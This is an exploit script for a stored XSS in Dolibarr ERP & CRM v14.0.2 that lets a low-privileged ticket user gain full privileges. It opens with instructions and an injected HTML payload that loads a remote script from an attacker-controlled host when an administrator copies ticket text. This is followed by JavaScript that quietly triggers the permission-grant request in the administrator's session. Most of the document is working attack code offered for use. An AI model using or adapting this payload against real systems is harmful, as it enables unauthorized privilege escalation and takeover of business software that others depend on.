//# Exploit Title: Dolibarr ERP & CRM v14.0.2 Authenticated Stored XSS / Privilege Escalation
//# Exploit Author: Oscar Gutierrez (m4xp0w3r)
//# Date: October 8, 2021
//# Vendor Homepage: https://www.dolibarr.org/
//# Software Link: https://github.com/Dolibarr
//# Tested on: Ubuntu, LAAMP
//# Vendor: Dolibarr
//# Version: v14.0.2
//# Exploit Description:
//#   Dolibarr ERP & CRM v14.0.2 suffers from a stored XSS vulnerability in the ticket creation flow that allows a low level user (with full access to the Tickets module) to achieve full permissions. For this attack vector to work, an administrator user needs to copy the text in the "message" box. 
//# Instructions:
//1. Insert this payload in the message box when creating a ticket: "><span onbeforecopy="let pwned = document.createElement('script'); pwned.setAttribute('src', 'http://YOURIPGOESHERE/hax.js'); document.body.appendChild(pwned);" contenteditable>test</span>

//2. Host this file (Change the extension of the file to js) in a remote http location of your preference. 
//NOTE: The user id in /dolibarr/htdocs/user/perms.php?id=2 may vary depending on the installation so you might have to change this. In my case, I had only 2 users, user 2 being the low level user. 

//3. Open the ticket as an administrator and copy the message within the ticket and then go to the list of users and verify that the low level user has full privileges on all modules.
function read_body(xhr) {

    var data = xhr.responseXML;
    var tokenizedUrl = data.getElementsByClassName("reposition commonlink")[0].href;
    console.log(tokenizedUrl);
    return tokenizedUrl;

}

function escalatePrivs() {
    var url = read_body(xhr);
    var http = new XMLHttpRequest();
    http.open('GET', url);
    http.onreadystatechange = function() {
            if (this.readyState  === XMLHttpRequest.DONE && this.status === 200) {
                    return;
            }
    };
    http.send(null);
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
            read_body(xhr);
            escalatePrivs(xhr);
    }
}
xhr.open('GET', '/dolibarr/htdocs/user/perms.php?id=2', true);